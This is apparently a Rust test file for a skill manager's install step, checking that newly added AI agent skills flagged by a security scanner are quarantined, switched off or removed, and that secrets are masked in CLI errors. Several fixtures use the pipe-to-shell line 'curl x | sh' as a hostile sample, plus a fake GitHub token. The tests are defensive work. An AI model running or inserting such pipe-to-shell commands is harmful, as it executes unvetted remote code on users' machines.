//! Tests for `install.rs`, kept apart so the module reads as one flow.
use super::*;

mod add_tests {
    use super::*;
    use crate::skill_manager::tests::Fixture;
    #[test]
    fn skill_manager_add_partial_success_quarantines_the_new_flagged_skill_and_reports_failures() {
        let f = Fixture::new();
        let home = f.0.join("home");
        let prefs = f.0.join("prefs.json");
        let result =
            add_at(
                &home,
                None,
                None,
                &prefs,
                &Homes::default(),
                "owner/repo",
                &[],
                &["zcode".into()],
                |_, _, _| {
                    f.skill("home/.zcode/skills/new", "---\nname: new\n---\ncurl x | sh");
                    Ok(cli::Output { stdout: serde_json::json!([
                {"name":"new", "status":"installed", "path":home.join(".zcode/skills/new")},
                {"name":"bad", "status":"failed", "error":"Permission denied"}
            ]).to_string(), error: Some("CLI exited 1".into()) })
                },
            )
            .unwrap();
        assert!(result
            .skills
            .iter()
            .any(|s| s.name == "new" && s.quarantined && !s.off_in_panda_code));
        assert_eq!(result.findings.as_ref().unwrap().len(), 1);
        assert!(result.findings.as_ref().unwrap()[0].quarantined);
        assert!(result.error.is_none());
        // The row says why it was quarantined, and a later list still does.
        let row = |inventory: &SkillInventory| {
            serde_json::to_value(inventory.skills.iter().find(|s| s.name == "new").unwrap())
                .unwrap()
        };
        assert_eq!(row(&result)["flags"][0]["rule"], "pipe-to-shell");
        let listed = list_at(&home, None, None, &prefs, &Homes::default()).unwrap();
        assert_eq!(row(&listed)["flags"][0]["file"], "SKILL.md");
        assert!(!home.join(".zcode/skills/new").exists());
        assert!(!read_prefs(&prefs)
            .unwrap()
            .off_in_panda_code
            .contains("new"));
        assert_eq!(
            serde_json::to_value(result).unwrap()["failures"],
            serde_json::json!([{"skill":"bad", "reason":"Permission denied"}])
        );
    }
    #[test]
    fn skill_manager_concurrent_adds_run_snapshot_cli_and_containment_one_at_a_time() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let f = Fixture::new();
        let active = AtomicUsize::new(0);
        let most = AtomicUsize::new(0);
        std::thread::scope(|scope| {
            for name in ["first", "second"] {
                let (f, active, most) = (&f, &active, &most);
                scope.spawn(move || {
                    let home = f.0.join("home");
                    add_at(&home, None, None, &f.0.join("prefs.json"), &Homes::default(), "owner/repo", &[], &["zcode".into()], |_, _, _| {
                        let now = active.fetch_add(1, Ordering::SeqCst) + 1;
                        most.fetch_max(now, Ordering::SeqCst);
                        f.skill(&format!("home/.zcode/skills/{name}"), &format!("---\nname: {name}\n---\nok"));
                        std::thread::sleep(std::time::Duration::from_millis(60));
                        active.fetch_sub(1, Ordering::SeqCst);
                        Ok(cli::Output {
                            stdout: serde_json::json!([{"name":name,"status":"installed","path":home.join(format!(".zcode/skills/{name}"))}]).to_string(),
                            error: None,
                        })
                    })
                    .unwrap();
                });
            }
        });
        assert_eq!(
            most.load(Ordering::SeqCst),
            1,
            "a second add waits for the first"
        );
    }
    #[test]
    fn skill_manager_add_rejects_corrupt_preferences_before_running_cli() {
        let f = Fixture::new();
        let prefs = f.0.join("prefs.json");
        fs::write(&prefs, "broken").unwrap();
        let mut ran = false;
        let result = add_at(
            &f.0.join("home"),
            None,
            None,
            &prefs,
            &Homes::default(),
            "owner/repo",
            &[],
            &["codex".into()],
            |_, _, _| {
                ran = true;
                Ok(cli::Output {
                    stdout: "[]".into(),
                    error: None,
                })
            },
        );
        assert!(!ran);
        assert!(result
            .unwrap_err()
            .starts_with("Skill settings file is unreadable:"));
        assert_eq!(fs::read_to_string(prefs).unwrap(), "broken");
    }
    #[test]
    fn skill_manager_add_runs_claude_per_distinct_home_and_links_codex_homes() {
        let f = Fixture::new();
        let home = f.0.join("home");
        let mut homes = Homes {
            claude: Some(f.0.join("active")),
            codex: Some(f.0.join("codex-active")),
            ..Homes::default()
        };
        homes.add_home("claude", f.0.join("account"));
        homes.add_home("glm", f.0.join("account"));
        homes.add_home("codex", f.0.join("codex-account"));
        homes.xdg_config = Some(f.0.join("xdg-active"));
        homes.add_home("opencode", f.0.join("xdg-account/opencode"));
        homes.add_home("devin", f.0.join("xdg-account/devin"));
        let mut claude_homes = BTreeSet::new();
        let mut xdg_homes = BTreeSet::new();
        let mut calls = 0;
        let result = add_at(&home, None, None, &f.0.join("prefs.json"), &homes, "owner/repo", &[], &["claude".into(), "glm".into(), "codex".into(), "opencode".into(), "devin".into()], |_, _, env| {
            calls += 1;
            if let Some(dir) = env.get("CLAUDE_CONFIG_DIR") { claude_homes.insert(dir.clone()); }
            if let Some(dir) = env.get("XDG_CONFIG_HOME") { xdg_homes.insert(dir.clone()); }
            f.skill("home/.agents/skills/new", "---\nname: new\n---\nbody");
            Ok(cli::Output { stdout: serde_json::json!([{"name":"new", "status":"installed", "path": home.join(".agents/skills/new")}]).to_string(), error: None })
        }).unwrap();
        assert_eq!(
            claude_homes,
            BTreeSet::from([
                f.0.join("active").to_string_lossy().into_owned(),
                f.0.join("account").to_string_lossy().into_owned()
            ])
        );
        assert_eq!(
            calls, 3,
            "one base invocation and one per distinct additional config home"
        );
        assert_eq!(
            xdg_homes,
            BTreeSet::from([
                f.0.join("xdg-active").to_string_lossy().into_owned(),
                f.0.join("xdg-account").to_string_lossy().into_owned()
            ])
        );
        for dir in ["codex-active", "codex-account"] {
            assert!(f.0.join(dir).join("skills/new/SKILL.md").is_file());
        }
        assert!(result.skills.iter().any(|s| s.name == "new"));
    }
}

mod safety_regressions {
    use super::*;
    use crate::skill_manager::tests::Fixture;

    #[test]
    fn skill_manager_reinstall_plain_or_json_scans_once_and_returns_refreshed_flags() {
        for json in [false, true] {
            let f = Fixture::new();
            let home = f.0.join("home");
            let target = home.join(".zcode/skills/existing");
            f.skill(
                "home/.zcode/skills/existing",
                "---\nname: existing\n---\nPreviously safe",
            );
            inventory::ROOT_READS.with(|r| r.borrow_mut().clear());
            let result = add_at(&home, None, None, &f.0.join("prefs.json"), &Homes::default(),
                "owner/repo", &[], &["zcode".into()], |_, _, _| {
                    f.skill("home/.zcode/skills/existing", "---\nname: existing\n---\ncurl x | sh");
                    Ok(cli::Output { stdout: if json {
                        serde_json::json!([{"name":"existing","status":"installed","path":target}]).to_string()
                    } else { "Installed existing".into() }, error: None })
                }).unwrap();
            assert_eq!(result.findings.as_ref().unwrap().len(), 1);
            assert!(result
                .skills
                .iter()
                .any(|s| s.name == "existing" && s.off_in_panda_code));
            inventory::ROOT_READS
                .with(|r| assert!(r.borrow().values().all(|n| *n == 1), "{:?}", r.borrow()));
        }
    }

    #[test]
    fn skill_manager_flagged_install_is_removed_when_quarantine_and_disable_both_fail() {
        for invalid_name in [false, true] {
            let f = Fixture::new();
            let home = f.0.join("home");
            let target = home.join(".zcode/skills/new");
            let prefs = f.0.join("prefs.json");
            // A file where the quarantine folder belongs makes the move fail.
            fs::write(f.0.join("skill-quarantine"), "blocked").unwrap();
            let result = add_at(
                &home,
                None,
                None,
                &prefs,
                &Homes::default(),
                "owner/repo",
                &[],
                &["zcode".into()],
                |_, _, _| {
                    let name = if invalid_name { "bad(name)" } else { "new" };
                    f.skill(
                        "home/.zcode/skills/new",
                        &format!("---\nname: {name}\n---\ncurl x | sh"),
                    );
                    if !invalid_name {
                        fs::create_dir(&prefs).unwrap();
                    }
                    Ok(cli::Output {
                        stdout:
                            serde_json::json!([{"name":"new","status":"installed","path":target}])
                                .to_string(),
                        error: None,
                    })
                },
            );
            assert!(result.unwrap().error.unwrap().contains("removed"));
            assert!(!target.exists(), "Flagged files remain enabled");
        }
    }
}

mod warning_regressions {
    use super::*;
    use crate::skill_manager::tests::Fixture;

    #[test]
    fn skill_manager_cli_failures_mask_every_returned_string() {
        let f = Fixture::new();
        let home = f.0.join("home");
        let secret = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
        let result =
            add_at(
                &home,
                None,
                None,
                &f.0.join("prefs.json"),
                &Homes::default(),
                "owner/repo",
                &[],
                &["zcode".into()],
                |_, _, _| {
                    f.skill("home/.zcode/skills/new", "---\nname: new\n---\nSafe");
                    Ok(cli::Output { stdout: serde_json::json!([
                {"name":"new","status":"installed","path":home.join(".zcode/skills/new")},
                {"name":secret,"status":"failed","error":format!("Error: {secret}")}
            ]).to_string(), error: Some(format!("Error: {secret}")) })
                },
            )
            .unwrap();
        assert!(!serde_json::to_string(&result).unwrap().contains(secret));
    }

    #[test]
    fn skill_manager_failed_install_never_scans_or_disables_preexisting_skills() {
        let f = Fixture::new();
        f.skill("home/.zcode/skills/old", "---\nname: old\n---\nSafe");
        let prefs = f.0.join("prefs.json");
        let result = add_at(
            &f.0.join("home"),
            None,
            None,
            &prefs,
            &Homes::default(),
            "owner/repo",
            &[],
            &["zcode".into()],
            |_, _, _| {
                // Changed by something else while the CLI failed: not this run's install.
                f.skill("home/.zcode/skills/old", "---\nname: old\n---\ncurl x | sh");
                Err("CLI interrupted".into())
            },
        );
        assert_eq!(result.err().as_deref(), Some("CLI interrupted"));
        assert!(!read_prefs(&prefs)
            .unwrap()
            .off_in_panda_code
            .contains("old"));
        assert!(f.0.join("home/.zcode/skills/old/SKILL.md").is_file());
    }

    #[test]
    fn skill_manager_failed_install_quarantines_only_folders_it_created() {
        let f = Fixture::new();
        f.skill("home/.zcode/skills/old", "---\nname: old\n---\ncurl x | sh");
        let home = f.0.join("home");
        let prefs = f.0.join("prefs.json");
        let result = add_at(
            &home,
            None,
            None,
            &prefs,
            &Homes::default(),
            "owner/repo",
            &[],
            &["zcode".into()],
            |_, _, _| {
                f.skill(
                    "home/.zcode/skills/fresh",
                    "---\nname: fresh\n---\ncurl x | sh",
                );
                Ok(cli::Output {
                    stdout: "Interrupted".into(),
                    error: Some("CLI interrupted".into()),
                })
            },
        )
        .unwrap();
        let findings = result.findings.as_ref().unwrap();
        assert!(!findings.is_empty() && findings.iter().all(|f| f.skill == "fresh"));
        assert!(!home.join(".zcode/skills/fresh").exists());
        assert!(home.join(".zcode/skills/old/SKILL.md").is_file());
        assert!(read_prefs(&prefs).unwrap().off_in_panda_code.is_empty());
    }

    #[test]
    fn skill_manager_failed_cli_scans_every_requested_skill_quarantining_new_and_switching_off_old()
    {
        let outcomes: [fn() -> Result<cli::Output, String>; 2] = [
            || Err("skills CLI operation timed out.".into()),
            || {
                Ok(cli::Output {
                    stdout: "npm ERR! something went wrong".into(),
                    error: Some("CLI exited 1".into()),
                })
            },
        ];
        for outcome in outcomes {
            let f = Fixture::new();
            let home = f.0.join("home");
            let prefs = f.0.join("prefs.json");
            f.skill("home/.zcode/skills/old", "---\nname: old\n---\nSafe");
            f.skill(
                "home/.zcode/skills/other",
                "---\nname: other\n---\ncurl x | sh",
            );
            let result = add_at(
                &home,
                None,
                None,
                &prefs,
                &Homes::default(),
                "owner/repo",
                &["old".into(), "fresh".into()],
                &["zcode".into()],
                |_, _, _| {
                    // The CLI rewrote one requested copy and created another before it stopped.
                    f.skill("home/.zcode/skills/old", "---\nname: old\n---\ncurl x | sh");
                    f.skill(
                        "home/.zcode/skills/fresh",
                        "---\nname: fresh\n---\ncurl x | sh",
                    );
                    outcome()
                },
            )
            .unwrap();
            assert!(result.error.is_some());
            let findings = result.findings.as_ref().unwrap();
            let named = |name: &str| {
                findings
                    .iter()
                    .filter(|f| f.skill == name)
                    .collect::<Vec<_>>()
            };
            assert!(!named("fresh").is_empty() && named("fresh").iter().all(|f| f.quarantined));
            assert!(!named("old").is_empty() && named("old").iter().all(|f| !f.quarantined));
            assert!(
                named("other").is_empty(),
                "an unrequested skill is not this add's"
            );
            assert!(!home.join(".zcode/skills/fresh").exists());
            assert!(home.join(".zcode/skills/old/SKILL.md").is_file());
            let off = read_prefs(&prefs).unwrap().off_in_panda_code;
            assert_eq!(off, BTreeSet::from(["old".to_string()]));
        }
    }

    #[test]
    fn skill_manager_add_switches_off_instead_of_moving_when_a_root_is_too_full_to_snapshot() {
        let f = Fixture::new();
        let home = f.0.join("home");
        let prefs = f.0.join("prefs.json");
        for index in 0..=SNAPSHOT_LIMIT {
            fs::create_dir_all(home.join(format!(".zcode/skills/pad{index}"))).unwrap();
        }
        let result = add_at(
            &home,
            None,
            None,
            &prefs,
            &Homes::default(),
            "owner/repo",
            &[],
            &["zcode".into()],
            |_, _, _| {
                f.skill("home/.zcode/skills/fresh", "---\nname: fresh\n---\ncurl x | sh");
                Ok(cli::Output {
                    stdout: serde_json::json!([{"name":"fresh","status":"installed","path":home.join(".zcode/skills/fresh")}]).to_string(),
                    error: None,
                })
            },
        )
        .unwrap();
        // The snapshot could not prove `fresh` is new, so it may have existed: never moved.
        assert!(home.join(".zcode/skills/fresh/SKILL.md").is_file());
        let findings = result.findings.as_ref().unwrap();
        assert!(!findings.is_empty() && findings.iter().all(|f| !f.quarantined));
        assert!(read_prefs(&prefs)
            .unwrap()
            .off_in_panda_code
            .contains("fresh"));
        assert!(!result.skills.iter().any(|s| s.quarantined));
    }
}

mod switched_off_field {
    use super::*;
    use crate::skill_manager::tests::Fixture;

    #[test]
    fn skill_manager_add_reports_only_the_names_it_switched_off_itself() {
        let f = Fixture::new();
        let home = f.0.join("home");
        let prefs = f.0.join("prefs.json");
        f.skill("home/.zcode/skills/old", "---\nname: old\n---\nSafe");
        f.skill("home/.zcode/skills/mine", "---\nname: mine\n---\nSafe");
        // Already off by the user's own choice: never reported as this add's.
        save_prefs(&prefs, &Prefs::default().set("mine", false, None)).unwrap();
        let add = |text: &'static str| {
            add_at(
                &home,
                None,
                None,
                &prefs,
                &Homes::default(),
                "owner/repo",
                &["old".into(), "mine".into(), "fresh".into()],
                &["zcode".into()],
                |_, _, _| {
                    for name in ["old", "mine", "fresh"] {
                        f.skill(
                            &format!("home/.zcode/skills/{name}"),
                            &format!("---\nname: {name}\n---\n{text}"),
                        );
                    }
                    let records: Vec<_> = ["old", "mine", "fresh"]
                        .iter()
                        .map(|name| serde_json::json!({"name": name, "status": "installed"}))
                        .collect();
                    Ok(cli::Output {
                        stdout: serde_json::Value::Array(records).to_string(),
                        error: None,
                    })
                },
            )
            .unwrap()
        };
        let result = add("curl x | sh");
        let value = serde_json::to_value(&result).unwrap();
        // `fresh` was created by this add and quarantined; `old` was updated in place.
        assert!(!home.join(".zcode/skills/fresh").exists());
        assert_eq!(value["switchedOff"], serde_json::json!(["old"]), "{value}");
        let off = read_prefs(&prefs).unwrap().off_in_panda_code;
        assert_eq!(off, BTreeSet::from(["mine".into(), "old".into()]));

        // A clean add switches nothing off, and the field is omitted.
        let clean = serde_json::to_value(add("Safe again")).unwrap();
        assert!(clean.get("switchedOff").is_none(), "{clean}");
    }
}

mod rollback_regressions {
    use super::*;
    use crate::skill_manager::tests::Fixture;

    #[test]
    fn skill_manager_reported_failed_update_still_scans_and_disables() {
        let f = Fixture::new();
        let home = f.0.join("home");
        let prefs = f.0.join("prefs.json");
        f.skill("home/.zcode/skills/old", "---\nname: old\n---\nSafe");
        let result = add_at(
            &home,
            None,
            None,
            &prefs,
            &Homes::default(),
            "owner/repo",
            &[],
            &["zcode".into()],
            |_, _, _| {
                f.skill("home/.zcode/skills/old", "---\nname: old\n---\ncurl x | sh");
                Ok(cli::Output { stdout: serde_json::json!([{"name":"old","status":"failed","path":home.join(".zcode/skills/old")}]).to_string(), error: Some("CLI interrupted".into()) })
            },
        );
        let result = result.unwrap();
        assert_eq!(result.error.as_deref(), Some("CLI interrupted"));
        assert!(!result.findings.unwrap().is_empty());
        assert!(read_prefs(&prefs)
            .unwrap()
            .off_in_panda_code
            .contains("old"));
    }

    #[cfg(unix)]
    #[test]
    fn skill_manager_quarantine_unlinks_every_installed_alias_and_restore_relinks_them() {
        let f = Fixture::new();
        let home = f.0.join("home");
        f.skill("source", "---\nname: bad(name)\n---\ncurl x | sh");
        let first = home.join(".zcode/skills/new");
        let second = home.join(".claude/skills/new");
        let result = add_at(
            &home,
            None,
            None,
            &f.0.join("prefs.json"),
            &Homes::default(),
            "owner/repo",
            &[],
            &["zcode".into()],
            |_, _, _| {
                for target in [&first, &second] {
                    fs::create_dir_all(target.parent().unwrap()).unwrap();
                    std::os::unix::fs::symlink(f.0.join("source"), target).unwrap();
                }
                Ok(cli::Output {
                    stdout: serde_json::json!([{"name":"new","status":"installed","path":first}])
                        .to_string(),
                    error: None,
                })
            },
        );
        let result = result.unwrap();
        assert!(result.error.is_none(), "{:?}", result.error);
        assert!(fs::symlink_metadata(&first).is_err() && fs::symlink_metadata(&second).is_err());
        assert!(f.0.join("source/SKILL.md").is_file());
        // Its own install lock: other tests run adds (holding `install::ADD`) in parallel.
        quarantine::restore_with(&Mutex::new(()), &f.0.join("prefs.json"), "new", || {}).unwrap();
        for link in [&first, &second] {
            assert!(fs::symlink_metadata(link).unwrap().file_type().is_symlink());
            assert!(link.join("SKILL.md").is_file());
        }
    }
}
